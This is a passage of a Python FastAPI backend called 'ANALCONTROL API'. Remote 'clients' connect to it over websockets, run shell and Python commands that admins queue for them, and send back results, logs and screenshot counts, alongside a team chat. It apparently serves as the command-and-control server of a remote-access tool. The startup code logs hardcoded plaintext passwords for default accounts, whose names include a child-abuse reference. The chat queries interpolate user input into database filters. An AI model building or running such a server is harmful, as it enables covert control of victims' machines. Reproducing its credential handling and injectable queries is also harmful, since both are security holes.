            logs_list = db.logs.copy()
            
            # Apply filters
            if client_id:
                logs_list = [l for l in logs_list if l.get("client_id") == client_id]
            
            if log_type and log_type != "all":
                logs_list = [l for l in logs_list if l.get("log_type") == log_type]
            
            # Sort by date
            logs_list.sort(key=lambda x: x.get("created_at", ""), reverse=True)
            logs_list = logs_list[:limit]
        
        return {
            "success": True,
            "logs": logs_list
        }
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/stats", response_model=dict)
async def get_stats(user: dict = Depends(authenticate_user)):
    """Get system statistics"""
    try:
        stats = {
            "total_clients": 0,
            "online_clients": 0,
            "ws_online_clients": len(manager.client_connections),
            "pending_commands": 0,
            "total_commands": 0,
            "today_logs": 0,
            "total_screenshots": 0,
            "total_users": 0
        }
        
        # Get from Supabase if available
        if supabase:
            try:
                # Get counts
                clients_resp = supabase.table("clients").select("count").execute()
                online_resp = supabase.table("clients").select("count").eq("online", True).execute()
                commands_resp = supabase.table("commands").select("count").execute()
                pending_resp = supabase.table("commands").select("count").eq("status", "pending").execute()
                screenshots_resp = supabase.table("screenshots").select("count").execute()
                users_resp = supabase.table("users").select("count").execute()
                
                # Get today's logs
                today = datetime.utcnow().date().isoformat()
                logs_resp = supabase.table("logs")\
                    .select("count")\
                    .gte("created_at", f"{today}T00:00:00")\
                    .execute()
                
                if clients_resp.data:
                    stats["total_clients"] = clients_resp.data[0]["count"]
                if online_resp.data:
                    stats["online_clients"] = online_resp.data[0]["count"]
                if commands_resp.data:
                    stats["total_commands"] = commands_resp.data[0]["count"]
                if pending_resp.data:
                    stats["pending_commands"] = pending_resp.data[0]["count"]
                if logs_resp.data:
                    stats["today_logs"] = logs_resp.data[0]["count"]
                if screenshots_resp.data:
                    stats["total_screenshots"] = screenshots_resp.data[0]["count"]
                if users_resp.data:
                    stats["total_users"] = users_resp.data[0]["count"]
                    
            except Exception as e:
                logger.error(f"Supabase stats error: {e}")
        
        # Add in-memory data
        stats["total_clients"] = max(stats["total_clients"], len(db.clients))
        stats["online_clients"] = max(stats["online_clients"], len([c for c in db.clients.values() if c.get("online")]))
        stats["total_commands"] = max(stats["total_commands"], len(db.commands))
        stats["pending_commands"] = max(stats["pending_commands"], len([c for c in db.commands if c.get("status") in ["pending", "running"]]))
        stats["today_logs"] = max(stats["today_logs"], len([l for l in db.logs if l.get("created_at", "").startswith(datetime.utcnow().date().isoformat())]))
        stats["total_users"] = max(stats["total_users"], len(db.users))
        
        stats["active_admins"] = len(manager.admin_connections)
        stats["chat_users"] = len(manager.chat_connections)
        
        return {
            "success": True,
            "stats": stats
        }
    except Exception as e:
        logger.error(f"Get stats error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== UPDATE CHAT MESSAGES ENDPOINT ==========
@app.get("/api/chat/messages", response_model=dict)
async def get_chat_messages(
    user: dict = Depends(authenticate_user),
    recipient: Optional[str] = Query(None),
    limit: int = Query(100, ge=1, le=1000),
    before: Optional[str] = Query(None)
):
    """Get chat messages with filtering"""
    try:
        user_id = user.get("email")
        messages = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("chat_messages").select("*")
            
            # Filter messages based on recipient
            if recipient:
                if recipient == "all":
                    # Global chat messages
                    query = query.or_(f"recipient.eq.all,recipient.is.null")
                else:
                    # Private messages between users
                    query = query.or_(
                        f"and(sender.eq.{user_id},recipient.eq.{recipient})," +
                        f"and(sender.eq.{recipient},recipient.eq.{user_id})"
                    )
            else:
                # All messages visible to user
                query = query.or_(
                    f"recipient.eq.all,recipient.is.null," +
                    f"recipient.eq.{user_id},sender.eq.{user_id}"
                )
            
            if before:
                query = query.lt("timestamp", before)
            
            response = query.order("timestamp", desc=True).limit(limit).execute()
            
            if response.data:
                messages = response.data
        else:
            # Fallback to in-memory
            messages = db.chat_messages.copy()
            
            # Filter messages based on recipient
            if recipient:
                if recipient == "all":
                    # Global chat messages
                    messages = [
                        msg for msg in messages
                        if msg["recipient"] in ["all", None]
                    ]
                else:
                    # Private messages between users
                    messages = [
                        msg for msg in messages
                        if (msg["sender"] == user_id and msg["recipient"] == recipient) or
                           (msg["sender"] == recipient and msg["recipient"] == user_id)
                    ]
            else:
                # All messages visible to user
                messages = [
                    msg for msg in messages
                    if (msg["recipient"] in [user_id, "all", None] or 
                        msg["sender"] == user_id or 
                        user_id in msg.get("read_by", []))
                ]
            
            if before:
                messages = [msg for msg in messages if msg["timestamp"] < before]
            
            messages.sort(key=lambda x: x["timestamp"], reverse=True)
            messages = messages[:limit]
        
        # Add user tags to messages
        for msg in messages:
            sender_tag = db.get_user_tag(msg["sender"])
            if sender_tag:
                msg["sender_tag"] = sender_tag
        
        return {
            "success": True,
            "messages": messages[::-1],  # Return in chronological order
            "total": len(messages)
        }
        
    except Exception as e:
        logger.error(f"Get chat messages error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== ADD PRIVATE CONVERSATIONS ENDPOINT ==========
@app.get("/api/chat/conversations", response_model=dict)
async def get_conversations(user: dict = Depends(authenticate_user)):
    """Get list of users you have conversations with"""
    try:
        user_id = user.get("email")
        conversations = set()
        
        # Get from Supabase if available
        if supabase:
            # Get all messages involving this user
            response = supabase.table("chat_messages")\
                .select("sender, recipient")\
                .or_(f"sender.eq.{user_id},recipient.eq.{user_id}")\
                .execute()
            
            if response.data:
                for msg in response.data:
                    if msg["sender"] != user_id:
                        conversations.add(msg["sender"])
                    if msg["recipient"] and msg["recipient"] != "all" and msg["recipient"] != user_id:
                        conversations.add(msg["recipient"])
        else:
            # Fallback to in-memory
            for msg in db.chat_messages:
                if msg["sender"] == user_id and msg["recipient"] and msg["recipient"] != "all":
                    conversations.add(msg["recipient"])
                elif msg["recipient"] == user_id and msg["sender"] != user_id:
                    conversations.add(msg["sender"])
        
        # Get user details for each conversation
        conversation_users = []
        for user_email in conversations:
            user_data = db.get_user_by_email(user_email)
            if user_data:
                tag = db.get_user_tag(user_email)
                conversation_users.append({
                    "user_id": user_email,
                    "username": user_email,
                    "role": tag["role"] if tag else "user",
                    "color": tag["color"] if tag else "#8a2be2",
                    "online": user_email in manager.chat_connections
                })
        
        return {
            "success": True,
            "conversations": conversation_users
        }
        
    except Exception as e:
        logger.error(f"Get conversations error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/chat/messages", response_model=dict)
async def get_chat_messages(
    user: dict = Depends(authenticate_user),
    limit: int = Query(100, ge=1, le=1000),
    before: Optional[str] = Query(None)
):
    """Get chat messages"""
    try:
        user_id = user.get("email")
        messages = []
        
        # Get from Supabase if available
        if supabase:
            query = supabase.table("chat_messages").select("*")
            
            # Filter messages visible to user
            query = query.or_(f"recipient.eq.{user_id},recipient.is.null,recipient.eq.all,sender.eq.{user_id}")
            
            if before:
                query = query.lt("timestamp", before)
            
            response = query.order("timestamp", desc=True).limit(limit).execute()
            
            if response.data:
                messages = response.data
        else:
            # Fallback to in-memory
            messages = db.chat_messages.copy()
            
            # Filter messages visible to user
            messages = [
                msg for msg in messages
                if (msg["recipient"] in [user_id, "all", None] or 
                    msg["sender"] == user_id or 
                    user_id in msg.get("read_by", []))
            ]
            
            if before:
                messages = [msg for msg in messages if msg["timestamp"] < before]
            
            messages.sort(key=lambda x: x["timestamp"], reverse=True)
            messages = messages[:limit]
        
        # Add user tags to messages
        for msg in messages:
            sender_tag = db.get_user_tag(msg["sender"])
            if sender_tag:
                msg["sender_tag"] = sender_tag
        
        return {
            "success": True,
            "messages": messages[::-1],  # Return in chronological order
            "total": len(messages)
        }
        
    except Exception as e:
        logger.error(f"Get chat messages error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/chat/users", response_model=dict)
async def get_chat_users(user: dict = Depends(authenticate_user)):
    """Get online chat users"""
    try:
        online_users = list(manager.chat_connections.keys())
        user_data = []
        
        # Get all users from database
        all_users = []
        if supabase:
            response = supabase.table("users")\
                .select("email, is_admin, is_active")\
                .eq("is_active", True)\
                .execute()
            if response.data:
                all_users = response.data
        else:
            all_users = list(db.users.values())
        
        # Add global chat user
        user_data.append({
            "user_id": "all",
            "username": "Global Chat",
            "role": "global",
            "color": "#00ffff",
            "online": True,
            "last_seen": datetime.utcnow().isoformat()
        })
        
        # Prepare user data with tags
        for user_obj in all_users:
            user_email = user_obj["email"]
            if user_email == user.get("email"):
                continue  # Skip current user
                
            tag = db.get_user_tag(user_email)
            
            user_data.append({
                "user_id": user_email,
                "username": user_email,
                "role": tag["role"] if tag else "user",
                "color": tag["color"] if tag else "#8a2be2",
                "online": user_email in online_users,
                "last_seen": user_obj.get("last_login")
            })
        
        return {
            "success": True,
            "users": user_data
        }
        
    except Exception as e:
        logger.error(f"Get chat users error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/chat/upload-file", response_model=dict)
async def upload_chat_file(
    file: UploadFile = File(...),
    user: dict = Depends(authenticate_user)
):
    """Upload a file for chat"""
    try:
        # Read file
        contents = await file.read()
        
        # Convert to base64
        file_data = base64.b64encode(contents).decode('utf-8')
        
        # Determine file type
        file_type = file.content_type or mimetypes.guess_type(file.filename)[0] or "application/octet-stream"
        
        # Store file
        file_id = str(uuid.uuid4())
        file_record = {
            "id": file_id,
            "file_name": file.filename,
            "file_type": file_type,
            "size": len(contents),
            "uploader": user.get("email"),
            "uploaded_at": datetime.utcnow().isoformat(),
            "data": file_data
        }
        
        db.files[file_id] = file_record
        
        # Store in Supabase
        if supabase:
            try:
                supabase.table("chat_files").insert({
                    "id": file_id,
                    "file_name": file.filename,
                    "file_type": file_type,
                    "size": len(contents),
                    "uploader": user.get("email"),
                    "uploaded_at": datetime.utcnow().isoformat(),
                    "data": file_data
                }).execute()
            except Exception as e:
                logger.error(f"Supabase file storage error: {e}")
        
        return {
            "success": True,
            "file_id": file_id,
            "file_name": file.filename,
            "file_type": file_type,
            "size": len(contents),
            "download_url": f"/api/chat/download/{file_id}"
        }
        
    except Exception as e:
        logger.error(f"File upload error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/chat/download/{file_id}")
async def download_chat_file(
    file_id: str,
    user: dict = Depends(authenticate_user)
):
    """Download a chat file"""
    try:
        # Get file from database
        if supabase:
            response = supabase.table("chat_files")\
                .select("*")\
                .eq("id", file_id)\
                .execute()
            
            if not response.data:
                raise HTTPException(status_code=404, detail="File not found")
            
            file_record = response.data[0]
        else:
            file_record = db.files.get(file_id)
            if not file_record:
                raise HTTPException(status_code=404, detail="File not found")
        
        # Decode base64 data
        file_data = base64.b64decode(file_record["data"])
        
        # Return file
        return StreamingResponse(
            io.BytesIO(file_data),
            media_type=file_record["file_type"],
            headers={
                "Content-Disposition": f'attachment; filename="{file_record["file_name"]}"'
            }
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"File download error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/chat/mark-read/{message_id}", response_model=dict)
async def mark_message_read(
    message_id: str,
    user: dict = Depends(authenticate_user)
):
    """Mark a message as read"""
    try:
        user_id = user.get("email")
        
        # Update in memory
        for msg in db.chat_messages:
            if msg["id"] == message_id and user_id not in msg.get("read_by", []):
                msg.setdefault("read_by", []).append(user_id)
                break
        
        # Update Supabase
        if supabase:
            try:
                # This would need a more complex update in Supabase
                # For simplicity, we'll just log it
                logger.info(f"User {user_id} read message {message_id}")
            except Exception as e:
                logger.error(f"Supabase read update error: {e}")
        
        return {"success": True}
        
    except Exception as e:
        logger.error(f"Mark read error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== HEALTH AND INFO ==========
@app.get("/api/health", response_model=dict)
async def health_check():
    """Health check endpoint"""
    try:
        health_status = {
            "status": "healthy",
            "timestamp": datetime.utcnow().isoformat(),
            "version": "3.0",
            "database": "Supabase + In-Memory" if supabase else "In-Memory",
            "active_clients": len(manager.client_connections),
            "active_admins": len(manager.admin_connections),
            "chat_users": len(manager.chat_connections),
            "total_users": len(db.users),
            "total_clients": len(db.clients),
            "supabase_connected": supabase is not None
        }
        
        return health_status
    except Exception as e:
        logger.error(f"Health check error: {e}")
        return {
            "status": "unhealthy",
            "timestamp": datetime.utcnow().isoformat(),
            "error": str(e)
        }

@app.get("/api/user/theme", response_model=dict)
async def get_user_theme(user: dict = Depends(authenticate_user)):
    """Get user's theme"""
    try:
        theme = user.get("theme", "cyberpunk")
        return {
            "success": True,
            "theme": theme,
            "username": user.get("email")
        }
    except Exception as e:
        logger.error(f"Get theme error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/chat/send", response_model=dict)
async def send_chat_message(data: ChatMessage, user: dict = Depends(authenticate_user)):
    """Send a chat message"""
    try:
        user_id = user.get("email")
        
        # Prepare message data
        message_data = {
            "id": str(uuid.uuid4()),
            "sender": user_id,
            "recipient": data.recipient if data.recipient != "all" else None,
            "message": data.message,
            "is_voice_note": data.is_voice_note,
            "timestamp": datetime.utcnow().isoformat(),
            "read_by": [user_id]
        }
        
        # Add file data if present
        if data.file_data:
            message_data.update({
                "file_data": data.file_data,
                "file_name": data.file_name,
                "file_type": data.file_type,
                "size": len(base64.b64decode(data.file_data)) if data.file_data else 0
            })
        
        # Get sender tag
        sender_tag = db.get_user_tag(user_id)
        
        # Store in database
        db.add_chat_message(message_data)
        
        # Store in Supabase if available
        if supabase:
            try:
                supabase_message = message_data.copy()
                # Convert for Supabase storage
                if supabase_message.get("recipient") is None:
                    supabase_message["recipient"] = "all"
                
                supabase.table("chat_messages").insert(supabase_message).execute()
            except Exception as e:
                logger.error(f"Supabase chat message storage error: {e}")
        
        # Send via WebSocket to recipient
        if data.recipient == "all" or data.recipient is None:
            # Broadcast to all chat users except sender
            await manager.broadcast_chat({
                "type": "new_message",
                "message": message_data,
                "sender_tag": sender_tag,
                "timestamp": datetime.utcnow().isoformat()
            }, exclude_user=user_id)
        else:
            # Send to specific recipient
            await manager.send_to_user(data.recipient, {
                "type": "new_message",
                "message": message_data,
                "sender_tag": sender_tag,
                "timestamp": datetime.utcnow().isoformat()
            })
            
            # Also send to sender (for their own UI)
            await manager.send_to_user(user_id, {
                "type": "new_message",
                "message": message_data,
                "sender_tag": sender_tag,
                "timestamp": datetime.utcnow().isoformat()
            })
        
        logger.info(f"💬 Chat message sent from {user_id} to {data.recipient or 'all'}")
        
        return {
            "success": True,
            "message": "Message sent",
            "message_id": message_data["id"]
        }
        
    except Exception as e:
        logger.error(f"Send chat message error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

# ========== WEBSOCKET ENDPOINTS ==========
@app.websocket("/ws/admin")
async def websocket_admin(websocket: WebSocket):
    """WebSocket endpoint for admin dashboard"""
    try:
        await manager.connect_admin(websocket)
        
        # Send initial status
        await websocket.send_json({
            "type": "status",
            "message": "Connected to admin dashboard",
            "active_clients": len(manager.client_connections),
            "timestamp": datetime.utcnow().isoformat()
        })
        
        while True:
            try:
                data = await websocket.receive_json()
                
                # Handle ping
                if data.get("type") == "ping":
                    await websocket.send_json({
                        "type": "pong",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Error receiving WebSocket message: {e}")
                continue
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Admin WebSocket error: {e}")
        manager.disconnect(websocket)

@app.websocket("/ws/client/{client_id}")
async def websocket_client(websocket: WebSocket, client_id: str):
    """WebSocket endpoint for client connections"""
    try:
        await manager.connect_client(websocket, client_id)
        
        # Send welcome message
        await websocket.send_json({
            "type": "welcome",
            "message": f"Connected to server as {client_id}",
            "server_time": datetime.utcnow().isoformat()
        })
        
        while True:
            try:
                data = await websocket.receive_json()
                data_type = data.get("type")
                
                if data_type == "heartbeat":
                    # Update last seen
                    if client_id in db.clients:
                        db.clients[client_id]["last_seen"] = datetime.utcnow().isoformat()
                        db.clients[client_id]["online"] = True
                    
                    # Update Supabase
                    if supabase:
                        try:
                            supabase.table("clients")\
                                .update({
                                    "last_seen": datetime.utcnow().isoformat(),
                                    "online": True
                                })\
                                .eq("client_id", client_id)\
                                .execute()
                        except Exception as e:
                            logger.error(f"Supabase heartbeat update error: {e}")
                    
                    # Send heartbeat response
                    await websocket.send_json({
                        "type": "heartbeat_response",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "command_result":
                    # Update command status
                    command_id = data.get("command_id")
                    
                    # Update in-memory
                    for cmd in db.commands:
                        if cmd["id"] == command_id:
                            cmd["status"] = "completed"
                            cmd["result"] = data.get("result")
                            cmd["completed_at"] = datetime.utcnow().isoformat()
                            cmd["error"] = data.get("error", "")
                            break
                    
                    # Update Supabase
                    if supabase:
                        try:
                            supabase.table("commands")\
                                .update({
                                    "status": "completed",
                                    "result": data.get("result"),
                                    "error": data.get("error", ""),
                                    "completed_at": datetime.utcnow().isoformat()
                                })\
                                .eq("id", command_id)\
                                .execute()
                        except Exception as e:
                            logger.error(f"Supabase command result update error: {e}")
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "command_result",
                        "client_id": client_id,
                        "command_id": command_id,
                        "command": data.get("command"),
                        "result": data.get("result"),
                        "error": data.get("error"),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "python_result":
                    # Handle Python execution result
                    command_id = data.get("command_id")
                    
                    # Store in-memory
                    for cmd in db.commands:
                        if cmd["id"] == command_id:
                            cmd["status"] = "completed"
                            cmd["result"] = data.get("result")
                            cmd["completed_at"] = datetime.utcnow().isoformat()
                            cmd["error"] = data.get("error", "")
                            break
                    
                    # Update Supabase
                    if supabase:
                        try:
                            supabase.table("commands")\
                                .update({
                                    "status": "completed",
                                    "result": data.get("result"),
                                    "error": data.get("error", ""),
                                    "completed_at": datetime.utcnow().isoformat()
                                })\
                                .eq("id", command_id)\
                                .execute()
                        except Exception as e:
                            logger.error(f"Supabase Python result update error: {e}")
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "python_result",
                        "client_id": client_id,
                        "command_id": command_id,
                        "filename": data.get("filename"),
                        "result": data.get("result"),
                        "error": data.get("error"),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "log":
                    # Store log
                    log_entry = {
                        "id": str(uuid.uuid4()),
                        "client_id": client_id,
                        "log_type": data.get("log_type", "info"),
                        "message": data.get("message", ""),
                        "created_at": datetime.utcnow().isoformat()
                    }
                    
                    db.logs.append(log_entry)
                    
                    # Store in Supabase
                    if supabase:
                        try:
                            supabase.table("logs").insert({
                                "client_id": client_id,
                                "log_type": data.get("log_type", "info"),
                                "message": data.get("message", ""),
                                "created_at": datetime.utcnow().isoformat()
                            }).execute()
                        except Exception as e:
                            logger.error(f"Supabase log storage error: {e}")
                    
                    # Notify admins
                    await manager.notify_admins({
                        "type": "client_log",
                        "client_id": client_id,
                        "log_type": data.get("log_type", "info"),
                        "message": data.get("message", ""),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "client_chat_response":
                    # Forward client chat response to admins
                    await manager.notify_admins({
                        "type": "client_chat_response",
                        "client_id": client_id,
                        "message": data.get("message", ""),
                        "original_message": data.get("original_message", ""),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "client_chat_ack":
                    # Acknowledge chat message receipt
                    await manager.notify_admins({
                        "type": "client_chat_ack",
                        "client_id": client_id,
                        "message_received": data.get("message_received", ""),
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Error processing WebSocket message: {e}")
                continue
                
    except WebSocketDisconnect:
        # Mark client as offline
        if client_id in db.clients:
            db.clients[client_id]["online"] = False
            db.clients[client_id]["ws_online"] = False
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Client WebSocket error: {e}")
        # Mark client as offline
        if client_id in db.clients:
            db.clients[client_id]["online"] = False
            db.clients[client_id]["ws_online"] = False
        manager.disconnect(websocket)

@app.websocket("/ws/chat/{user_id}")
async def websocket_chat(websocket: WebSocket, user_id: str):
    """WebSocket endpoint for chat"""
    try:
        await manager.connect_chat(websocket, user_id)
        
        while True:
            try:
                data = await websocket.receive_json()
                data_type = data.get("type")
                
                if data_type == "ping":
                    await websocket.send_json({
                        "type": "pong",
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
                elif data_type == "typing":
                    # Broadcast typing indicator
                    await manager.broadcast_chat({
                        "type": "user_typing",
                        "user_id": user_id,
                        "is_typing": data.get("is_typing", False),
                        "timestamp": datetime.utcnow().isoformat()
                    }, exclude_user=user_id)
                    
                elif data_type == "read_receipt":
                    # Handle read receipts
                    message_id = data.get("message_id")
                    if message_id:
                        for msg in db.chat_messages:
                            if msg["id"] == message_id and user_id not in msg.get("read_by", []):
                                msg.setdefault("read_by", []).append(user_id)
                                
                                # Broadcast read receipt
                                await manager.broadcast_chat({
                                    "type": "message_read",
                                    "message_id": message_id,
                                    "user_id": user_id,
                                    "timestamp": datetime.utcnow().isoformat()
                                })
                                break
                    
            except WebSocketDisconnect:
                break
            except Exception as e:
                logger.error(f"Chat WebSocket error: {e}")
                continue
                
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Chat WebSocket error: {e}")
        manager.disconnect(websocket)

# ========== ERROR HANDLERS ==========
@app.exception_handler(HTTPException)
async def http_exception_handler(request: Request, exc: HTTPException):
    """Handle HTTP exceptions"""
    return JSONResponse(
        status_code=exc.status_code,
        content={
            "success": False,
            "detail": exc.detail,
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

@app.exception_handler(Exception)
async def general_exception_handler(request: Request, exc: Exception):
    """Handle all other exceptions"""
    logger.error(f"Unhandled exception: {exc}", exc_info=True)
    return JSONResponse(
        status_code=500,
        content={
            "success": False,
            "detail": "Internal server error",
            "path": request.url.path,
            "timestamp": datetime.utcnow().isoformat()
        }
    )

# ========== SERVE FRONTEND ==========
@app.get("/")
async def serve_frontend():
    """Serve the frontend HTML"""
    try:
        # Try to read the frontend HTML file
        with open("frontend.html", "r", encoding="utf-8") as f:
            html_content = f.read()
        return HTMLResponse(content=html_content)
    except:
        # Return a simple message if frontend file not found
        return JSONResponse({
            "message": "ANALCONTROL API is running",
            "version": "3.0",
            "endpoints": {
                "login": "/api/login",
                "docs": "/docs",
                "health": "/api/health",
                "ws_admin": "/ws/admin",
                "ws_client": "/ws/client/{client_id}",
                "ws_chat": "/ws/chat/{user_id}"
            },
            "note": "Place frontend.html in the same directory to serve the web interface"
        })

# ========== APPLICATION STARTUP ==========
@app.on_event("startup")
async def startup_event():
    """Initialize application on startup"""
    logger.info("=" * 60)
    logger.info("🚀 ANALCONTROL API v3.0 Starting...")
    logger.info(f"📡 Port: {PORT}")
    logger.info(f"🔗 Backend URL: {BACKEND_URL}")
    logger.info(f"📊 Supabase: {'Connected' if supabase else 'Not Connected'}")
    logger.info("🔗 WebSocket endpoints:")
    logger.info("   • Admin: /ws/admin")
    logger.info("   • Client: /ws/client/{client_id}")
    logger.info("   • Chat: /ws/chat/{user_id}")
    logger.info("📚 Documentation: /docs")
    logger.info("👤 Default users:")
    logger.info("   • xotiic/40671Mps19* (Owner) - Red tag")
    logger.info("   • admin/admin123 (Admin)")
    logger.info("   • nathan/femboy67 (Admin with femboy theme) - Purple tag")
    logger.info("   • kizer/kidraper67 (Sr Admin) - Orange tag")
    logger.info("💬 Chat system with file sharing enabled")
    logger.info("=" * 60)
    logger.info("✅ Application startup complete")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=PORT,
        log_level="info",
        access_log=True
    )
